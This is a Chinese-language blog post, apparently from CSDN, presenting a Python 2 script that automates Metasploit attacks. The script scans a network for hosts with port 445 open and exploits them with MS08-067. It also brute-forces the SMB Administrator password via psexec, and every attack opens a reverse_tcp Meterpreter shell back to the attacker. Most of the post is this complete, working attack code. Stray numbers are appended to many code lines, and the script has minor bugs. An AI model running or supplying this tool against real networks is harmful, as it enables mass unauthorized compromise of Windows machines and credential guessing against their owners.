Metasploit是一款强大的[漏洞扫描](https://so.csdn.net/so/search?q=%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F&spm=1001.2101.3001.7020)和利用工具，编写Python脚本与Metasploit进行交互，可以自动化的扫描和利用漏洞。

相关文章：[Metasploit框架的使用](https://blog.csdn.net/qq_36119192/article/details/83215257)

在脚本中，我们首选需要利用 [nmap](https://so.csdn.net/so/search?q=nmap&spm=1001.2101.3001.7020) 模块扫描目标主机是否开放了445端口，我们写了一个 findTarget() 函数，来扫描给定ip或者给定网段中开放了目标端口的主机，返回开放了445端口的主机列表。445端口是作为SMB文件共享协议的端口，在这个端口上，经常爆发出各种高危的漏洞。 相关文章：[文件共享协议之139/445端口](https://blog.csdn.net/qq_36119192/article/details/83279527#TCP139%E3%80%81445%E7%AB%AF%E5%8F%A3)

```
def findTarget(Hosts):              #扫描网段范围内开放445端口的主机      
    nmScan=nmap.PortScanner()      
    nmScan.scan(Hosts,'445')      
    targets=[]      
    for t in nmScan.all_hosts():      
        if nmScan[t].has_tcp(445):  #如果445端口提供了协议      
            state=nmScan[t]['tcp'][445]['state']  #查看445端口的状态      
            if state=='open':      
                print '[+]Found Target Host:'+t      1
                targets.append(t)       1
    return targets         #返回开放445端口的主机列表
```


Metasploit提供了一个被称为Meterpreter的高级动态载荷，它是一种后渗透工具。当渗透进目标主机后，Meterpreter会主动连接目标主机，并提供大量 分析和控制主机的参数。我们写了setupHandler()函数，使用 exploit/multi/handler监听数据，我们设置payload为 windows/x64/meterpreter/reverse\_tcp 。我们还需要设置一个全局变量DisablePayloadHandler，其作用是：我们已经新建了一个监听器，以后所有的主机都不必重复新建监听器。相关文章：[Meterpreter之exploit/multi/handler木马](https://mp.csdn.net/postedit/83869141)

```
def setupHandler(configFile,lhost,lport):               #监听被攻击的主机      
    configFile.write('use exploit/multi/handler\n')     #使用      
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp \n')  #设定payload载荷      
    configFile.write('set LPORT '+str(lport)+'\n')      #设置监听的端口      
    configFile.write('set LHOST '+lhost+'\n')           #设置监听的主机，也就是我们的主机      
    configFile.write('set DisablePayloadHandler 1\n')  #不重新监听      
    configFile.write('exploit  -j  -z\n')              #监听  j选项是将所有连接的会话保持在后台 -z不与任务进行即时交换
```


当脚本能够在目标主机上执行漏洞利用代码时，配置函数将向Metasploit  rc 脚本中写入用于生成漏洞利用代码的目标主机、本地地址和端口。该函数还将把使用哪个漏洞利用代码的指令也写入rc脚本文件中，这里我们使用 MS\_08067\_netapi漏洞。此外，该函数还需要设置Payload、Lport。最后，该脚本发送一条指令在同一个任务(job)的上下文环境中( -j )，不与任务进行即时交互的条件下 ( -z ) 利用对目标计算机上的漏洞

```
def confickerExploit(configFile,target,lhost,lport):       #漏洞利用      
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')  #漏洞利用代码      
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')      
    configFile.write('set RHOST '+str(target)+'\n')              #设定参数      
    configFile.write('set LPORT '+str(lport)+'\n')      
    configFile.write('set LHOST '+lhost+'\n')      
    configFile.write('exploit \n')
```


尽管如此我们已经可以成功的在被黑的主机上运行漏洞利用代码，但一旦目标主机安装了最新的安全补丁便可以阻止该代码被执行，因此我们的脚本还需要另一种攻击方式，如暴力破解SMB用户名和密码，以此获取在目标主机上远程执行一个进程的权限。输入smbBrute() 函数的参数有：Metasploit 脚本文件、目标主机、包含密码列表的另一个文件、本地地址、端口。用户名默认为windows管理员Administrator，打开密码列表文件，对于每一个密码，都会生成一个用来远程执行进程的Metasploit脚本，如果密码正确则远程执行进程的代码就会运行一个shell到攻击者本地地址对应的端口。

```
def smbBrute(configFile,target,passwdFile,lhost,lport):      
    username='Administrator'      
    pF=open(passwordFile,'r')      
    for password in pF.readlines():      
        password=password.strip('\n')      
        configFile.write('use exploit/windows/smb/psexec\n')      
        configFile.write('set SMBUser '+str(username)+'\n')      
        configFile.write('set SMBPass '+str(password)+'\n')      
        configFile.write('set RHOST '+str(target)+'\n')      1
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')      1
        configFile.write('set LPORT '+str(lport)+'\n')      1
        configFile.write('set LHOST '+lhost+'\n')      1
        configFile.write('exploit -j -z\n')
```


最后，对上面所有的代码进行整合。

```
# -*- coding: utf-8 -*-      
"""      
Created on Sun Nov  4 16:11:33 2018      
@author: 小谢      
"""      
import os      
import optparse      
import sys      
import nmap      1
def findTarget(Hosts):              #扫描网段范围内开放445端口的主机      1
    nmScan=nmap.PortScanner()      1
    nmScan.scan(Hosts,'445')      1
    targets=[]      1
    for t in nmScan.all_hosts():      1
        if nmScan[t].has_tcp(445):  #如果445端口提供了协议      1
            state=nmScan[t]['tcp'][445]['state']  #查看445端口的状态      1
            if state=='open':      1
                print '[+]Found Target Host:'+t      1
                targets.append(t)       2
    return targets         #返回开放445端口的主机列表      2
def setupHandler(configFile,lhost,lport):               #监听被攻击的主机      2
    configFile.write('use exploit/multi/handler\n')     #使用      2
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp \n')  #设定payload载荷      2
    configFile.write('set LPORT '+str(lport)+'\n')      #设置监听的端口      2
    configFile.write('set LHOST '+lhost+'\n')           #设置监听的主机，也就是我们的主机      2
    configFile.write('set DisablePayloadHandler 1\n')  #不重新监听      2
    configFile.write('exploit  -j  -z\n')                 #监听  j选项是将所有连接的会话保持在后台 -z不与任务进行即时交换       2
def confickerExploit(configFile,target,lhost,lport):       #漏洞利用      3
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')  #漏洞利用代码      3
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')      3
    configFile.write('set RHOST '+str(target)+'\n')              #设定参数      3
    configFile.write('set LPORT '+str(lport)+'\n')      3
    configFile.write('set LHOST '+lhost+'\n')      3
    configFile.write('exploit \n')      3
def smbBrute(configFile,target,passwdFile,lhost,lport):          #暴力破解SMB口令      3
    username='Administrator'      3
    pF=open(passwordFile,'r')      3
    for password in pF.readlines():      4
        password=password.strip('\n')      4
        configFile.write('use exploit/windows/smb/psexec\n')      4
        configFile.write('set SMBUser '+str(username)+'\n')      4
        configFile.write('set SMBPass '+str(password)+'\n')      4
        configFile.write('set RHOST '+str(target)+'\n')      4
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')      4
        configFile.write('set LPORT '+str(lport)+'\n')      4
        configFile.write('set LHOST '+lhost+'\n')      4
        configFile.write('exploit -j -z\n')      4
def main():      5
    configFile=open('meta.rc','w')  #以写入方式打开配置文件      5
    usage='[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> [-p/-P <LPORT> -F/-f <password File>]'      5
    parser=optparse.OptionParser(usage)      5
    parser.add_option('-H',dest='target',type='string',help='target host')      5
    parser.add_option('-p','-P',dest='lport',type='string',help='listen port')      5
    parser.add_option('-l','-L',dest='lhost',type='string',help='listen address')      5
    parser.add_option('-F','-f',dest='passwdFile',type='string',help='password file')      5
    (options,args)=parser.parse_args()      5
    passwdFile=options.passwdFile      5
    target=options.target      6
    lport=options.lport      6
    lhost=options.lhost      6
    if (target==None)|(lhost==None):      6
        print parser.usage      6
        exit(0)      6
    if options.lport==None:      6
        lport=='2333'      6
    targets=findTarget(options.target)           #寻找目标      6
    setupHandler(configFile,lhost,lport)         #设置配置文件      6
    for target in targets:                       #逐个攻击      7
        confickerExploit(configFile,target,lhost,lport)      7
        if passwdFile!=None:      7
            smbBrute(configFile,target,passwdFile,lhost,lport)      7
        configFile.close()      7
        os.system('msfconsole -r meta.rc')  #启动metasploit并读取配置文件      7
if __name__=='__main__':      7
    main()
```


当我们运行脚本，指定好参数后，脚本就会扫描目标主机中开放了445端口的主机，将其加入到 targets 列表中，然后将要攻击的代码写入 meta.rc 配置文件中，最后启动MSF读取配置文件进行攻击！

![](https://img-blog.csdnimg.cn/20181112085141799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20181112085333279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)